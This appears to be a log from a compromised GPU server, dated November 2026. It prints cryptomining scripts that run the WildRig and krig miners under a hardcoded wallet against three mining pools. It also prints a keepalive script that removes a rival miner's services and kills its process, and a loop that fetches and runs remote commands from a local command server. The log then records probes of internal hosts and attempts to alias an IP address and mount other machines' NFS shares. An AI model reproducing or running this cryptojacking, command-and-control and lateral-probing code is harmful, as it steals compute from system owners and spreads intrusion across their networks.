@@ -1,0 +1,148 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### START11 2026-11-24T20:22:35Z
+### PLH-SCRIPTS
+===== /opt/plh/run_gpu.sh
+#!/bin/bash
+i=$1
+W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+WN=plh-123-184-7-135-g$i
+B=/opt/arsenal/miners/wildrig/wildrig-multi
+[ -x "$B" ] || B=/opt/t19/wildrig-multi
+L=/opt/plh/log; mkdir -p $L
+echo "[$(date -u +%FT%TZ)] start $B card $i" >> $L/g$i.log
+exec nice -n 19 "$B" --algo pearlhash --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user "$W.$WN" --pass x --protocol stratum --opencl-devices $i --gpu-intensity 1 --gpu-temp-limit 90 --api-port 196$i >> $L/g$i.log 2>&1
+===== /opt/plh/keepalive.sh
+#!/bin/bash
+W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+D=/opt/plh
+# competitor keepers must not return
+if [ -e /etc/systemd/system/nk-guard.timer ] || systemctl is-active --quiet nk-guard.timer 2>/dev/null; then
+  systemctl stop nk-guard.timer nk-guard.service 2>/dev/null
+  rm -f /etc/systemd/system/nk-guard.timer /etc/systemd/system/nk-guard.service
+  for i in 0 1 2 3 4 5 6 7; do systemctl stop nk-g$i 2>/dev/null; rm -f /etc/systemd/system/nk-g$i.service; done
+  chmod 000 /usr/local/lib/nv-cache/.bd /usr/local/lib/nv-cache/g.sh 2>/dev/null
+  systemctl daemon-reload
+fi
+crontab -l 2>/dev/null | grep -v 'nv-cache/g.sh' | grep -v '/dev/shm/.u/sample.sh' | crontab -
+ps -eo pid,args | awk '$2=="/usr/local/lib/nv-cache/.bd"{print $1}' | xargs -r kill -9 2>/dev/null
+for i in 0 1 2 3 4 5 6 7; do
+  WN=plh-123-184-7-135-g$i
+  systemctl start plh-card@$i 2>/dev/null
+  pgrep -f "$WN" >/dev/null 2>&1 && continue
+  setsid nohup /bin/bash $D/run_gpu.sh $i >> $D/log/g$i.log 2>&1 &
+  sleep 1
+done
+===== /opt/plh/c2fetch.sh
+#!/bin/bash
+# second independent fetch-and-run loop (does not depend on t19c2)
+B=http://127.0.0.1:8099
+D=/opt/plh
+mkdir -p $D/log
+S=$(curl -s -m 8 $B/seq2 2>/dev/null | tr -dc 0-9)
+[ -z "$S" ] && exit 0
+L=$(cat $D/.seq2 2>/dev/null)
+[ "$S" = "$L" ] && exit 0
+echo "=== SEQ2 $S $(date -u) ===" >> $D/log/c2.log
+curl -s -m 60 $B/cmd2.sh -o $D/.cmd2.sh && /bin/bash $D/.cmd2.sh >> $D/log/c2.log 2>&1
+echo "=== END2 $S ===" >> $D/log/c2.log
+echo "$S" > $D/.seq2
+===== /root/ul/actor/plh_keepalive.sh
+#!/bin/bash
+W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+for i in 0 1 2 3 4 5 6 7; do
+  WN=plh-123-184-7-135-g$i
+  if systemctl is-active --quiet plh-card@$i; then continue; fi
+  systemctl start plh-card@$i 2>/dev/null
+  pgrep -f "krig-miner.*$WN" >/dev/null 2>&1 && continue
+  cd /opt/arsenal/miners/krig && setsid nohup ./krig-miner --coin pearl \
+    --url stratum+ssl://prl-sg.kryptex.network:8048 \
+    --url stratum+tcp://pool.pearlhash.xyz:9000 \
+    --url stratum+ssl://pearl-sg1.luckypool.io:3360 \
+    --user "$W/$WN" --password x -d "$i" --api-port 126$i >> /opt/plh/log/k$i.log 2>&1 &
+done
+### PLH-NEUTRAL
+/etc/systemd/system/plh-guard.timer
+/etc/systemd/system/plh-guard.service
+/etc/systemd/system/plh-card@.service
+/etc/cron.d/plh
+/etc/cron.d/plh-keepalive
+moved /opt/plh
+### HTTP-PROBE
+## 192.168.0.20 1900
+   / -> 200 b'{\n    "id": "",\n    "worker_id": "instance-az1vp8oi-1",\n    "version": "0.52.3",\n    "kind": "opencl",\n    "ua": "WildRig/0.52.3L",\n    "algo": "pearlhash",\n    "donate_level": 0.0,\n    "uptime": 57957,\n    "hashrate": {\n        "total": [\n            273403301356894,\n            273384875075437,\n  '
+   /docs -> 404 b''
+   /openapi.json -> 404 b''
+   /v1/models -> 404 b''
+   /health -> 404 b''
+   /metrics -> 404 b''
+## 192.168.0.20 1901
+   / -> 200 b'{\n    "id": "",\n    "worker_id": "instance-az1vp8oi-1",\n    "version": "0.52.3",\n    "kind": "opencl",\n    "ua": "WildRig/0.52.3L",\n    "algo": "pearlhash",\n    "donate_level": 0.0,\n    "uptime": 57957,\n    "hashrate": {\n        "total": [\n            268533652119177,\n            268492432545597,\n  '
+   /docs -> 404 b''
+   /openapi.json -> 404 b''
+   /v1/models -> 404 b''
+   /health -> 404 b''
+   /metrics -> 404 b''
+## 192.168.0.20 1907
+   / -> 200 b'{\n    "id": "",\n    "worker_id": "instance-az1vp8oi-1",\n    "version": "0.52.3",\n    "kind": "opencl",\n    "ua": "WildRig/0.52.3L",\n    "algo": "pearlhash",\n    "donate_level": 0.0,\n    "uptime": 57957,\n    "hashrate": {\n        "total": [\n            273811898543129,\n            273736386168787,\n  '
+   /docs -> 404 b''
+   /openapi.json -> 404 b''
+   /v1/models -> 404 b''
+   /health -> 404 b''
+   /metrics -> 404 b''
+## 192.168.0.21 1900
+   / -> ERR TimeoutError timed out
+   /docs -> ERR TimeoutError timed out
+   /openapi.json -> ERR TimeoutError timed out
+   /v1/models -> ERR TimeoutError timed out
+   /health -> ERR TimeoutError timed out
+   /metrics -> ERR TimeoutError timed out
+## 192.168.0.21 1907
+   / -> ERR TimeoutError timed out
+   /docs -> ERR TimeoutError timed out
+   /openapi.json -> ERR TimeoutError timed out
+   /v1/models -> ERR TimeoutError timed out
+   /health -> ERR TimeoutError timed out
+   /metrics -> ERR TimeoutError timed out
+## 192.168.0.22 14998
+   / -> 200 b'<!DOCTYPE html>\n<html lang="zh-CN">\n  <head>\n    <meta charset="UTF-8" />\n    <link rel="icon" type="image/svg+xml" href="/vite.svg" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <title>\xe6\x99\xba\xe8\x83\xbd\xe8\xae\xa1\xe7\xae\x97\xe5\xb9\xb3\xe5\x8f\xb0</title>\n    <script type="module" crossorigin src="/asset'
+   /docs -> 200 b'\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">\n    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">\n    <title>\xe6\x96\x87\xe4\xbb\xb6\xe7\xae\xa1\xe7\x90\x86\xe6\x8e\xa5\xe5\x8f\xa3 - Swagger UI</title>\n    </head'
+   /openapi.json -> 200 b'{"openapi":"3.1.0","info":{"title":"\xe6\x96\x87\xe4\xbb\xb6\xe7\xae\xa1\xe7\x90\x86\xe6\x8e\xa5\xe5\x8f\xa3","version":"0.1.0"},"paths":{"/upload":{"post":{"summary":"Upload","operationId":"upload_upload_post","requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/Body_upload_upload_post"}}},"required":true},"responses'
+   /v1/models -> 404 b'{"detail":"Not Found"}'
+   /health -> 404 b'{"detail":"Not Found"}'
+   /metrics -> 404 b'{"detail":"Not Found"}'
+## 192.168.0.22 18000
+   / -> 200 b'<!doctype html>\n<html lang="zh-CN">\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n  <meta name="description" content="\xe9\x9d\xa2\xe5\x90\x91\xe5\xbc\x80\xe6\xba\x90\xe7\xa7\x91\xe6\x8a\x80\xe6\x83\x85\xe6\x8a\xa5\xe7\xa0\x94\xe7\xa9\xb6\xe6\x8a\xa5\xe5\x91\x8a\xe7\x94\x9f\xe6\x88\x90\xe7\x9a\x84\xe8\xaf\x81\xe6\x8d\xae\xe4\xbc\x98\xe5\x85\x88\xe6\x99\xba\xe8\x83\xbd\xe4\xbd\x93">\n  <title>\xe7\xa5\x9e\xe7\xbb\x8f-\xe7\xac\xa6\xe5\x8f\xb7\xe5\x8d\x8f\xe5\x90\x8c\xe6\x8e\xa8\xe7\x90\x86\xe5\xb9\xb3\xe5\x8f\xb0 \xc2\xb7 \xe5\xbc\x80\xe6\xba\x90\xe7\xa7\x91\xe6\x8a\x80'
+   /docs -> 200 b'\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">\n    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/'
+   /openapi.json -> 200 b'{"openapi":"3.1.0","info":{"title":"Neuro-Symbolic Decision Platform","version":"1.0.0"},"paths":{"/health":{"get":{"summary":"Health","operationId":"health_health_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}},"/execute":{"post":{"summa'
+   /v1/models -> 404 b'{"detail":"Not Found"}'
+   /health -> 200 b'{"status":"ok","engine_count":10,"engines":["knowledge_graph","relational_db","search","calculator","planner","arxiv_search","pdf_ocr","crossref_search","openalex_search","github_search"],"model_path":"/netcache/huggingface/Qwen3-14B","model_loaded":true}'
+   /metrics -> 404 b'{"detail":"Not Found"}'
+## 192.168.0.22 18080
+   / -> 200 b'<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#132b3c"><meta name="description" content="\xe4\xb8\xa4\xe5\xa4\xa9\xe7\xba\xbf\xe4\xb8\x8b\xef\xbc\x8c\xe4\xb8\xa4\xe4\xb8\xaa\xe4\xbc\x81\xe4\xb8\x9a\xe9\xa1\xb9\xe7\x9b\xae\xe3\x80\x82\xe4\xbb\x8e\xe9\x9b\xb6\xe6\x9e\x84\xe5\xbb\xba\xe7\x9f\xa5\xe8\xaf\x86\xe6\x9c\x8d\xe5\x8a\xa1\xe5\x8a\xa9\xe6\x89\x8b\xe4\xb8\x8e\xe7\xbb\x8f\xe8\x90\xa5\xe5\x88\x86\xe6\x9e\x90ChatBI\xef\xbc\x8c\xe8\xb4\xaf\xe7'
+   /docs -> 404 b'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n'
+   /openapi.json -> 404 b'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n'
+   /v1/models -> 404 b'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n'
+   /health -> 404 b'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n'
+   /metrics -> 404 b'<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n'
+## 192.168.0.24 18080
+   / -> 200 b'<!doctype html>\n<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="data:,"><title>2026 Virtual Cell Benchmark</title><link rel="stylesheet" href="/static/groups.css?v=schedule-20260928"><script src="/static/groups'
+   /docs -> 404 b'{"detail": "\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xb8\x8d\xe5\xad\x98\xe5\x9c\xa8"}'
+   /openapi.json -> 404 b'{"detail": "\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xb8\x8d\xe5\xad\x98\xe5\x9c\xa8"}'
+   /v1/models -> 404 b'{"detail": "\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xb8\x8d\xe5\xad\x98\xe5\x9c\xa8"}'
+   /health -> 404 b'{"detail": "\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xb8\x8d\xe5\xad\x98\xe5\x9c\xa8"}'
+   /metrics -> 404 b'{"detail": "\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xb8\x8d\xe5\xad\x98\xe5\x9c\xa8"}'
+## 192.168.0.24 18086
+   / -> 200 b'<!doctype html>\r\n<html lang="zh-CN">\r\n<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CASIA1 \xc2\xb7 VCC \xc2\xb7 H/I/J/K/L/M/N/O/P Transfer Benchmark</title><link rel="stylesheet" href="/style.css?v=20261104-all-score-filters-v1"></head>\r\n<body>\r\n\r\n<div id'
+   /docs -> 404 b'{"error": "\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0\xe6\xad\xa4\xe9\xa1\xb5\xe9\x9d\xa2\xe3\x80\x82"}'
+   /openapi.json -> 404 b'{"error": "\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0\xe6\xad\xa4\xe9\xa1\xb5\xe9\x9d\xa2\xe3\x80\x82"}'
+   /v1/models -> 404 b'{"error": "\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0\xe6\xad\xa4\xe9\xa1\xb5\xe9\x9d\xa2\xe3\x80\x82"}'
+   /health -> 200 b'{"ok": true, "benchmark": "hijklmnop-from-replicate-20261014-v8", "ready": true}'
+   /metrics -> 404 b'{"error": "\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0\xe6\xad\xa4\xe9\xa1\xb5\xe9\x9d\xa2\xe3\x80\x82"}'
+### NFS-ALIAS
+bond0            UP             192.168.0.23/24 192.168.0.31/32 fe80::1270:fdff:fedb:53ac/64 
+mountfail 192.168.0.24:/ssd1 :: mount.nfs: access denied by server while mounting 192.168.0.24:/ssd1
+mountfail 192.168.0.24:/ssd2 :: mount.nfs: access denied by server while mounting 192.168.0.24:/ssd2
+mountfail 192.168.0.28:/ssd1 :: mount.nfs: access denied by server while mounting 192.168.0.28:/ssd1
+mountfail 192.168.0.30:/ssd1 :: mount.nfs: access denied by server while mounting 192.168.0.30:/ssd1
+mountfail 192.168.0.31:/ssd1 :: mount.nfs: access denied by server while mounting 192.168.0.31:/ssd1
+### DONE11 2026-11-24T20:23:25Z
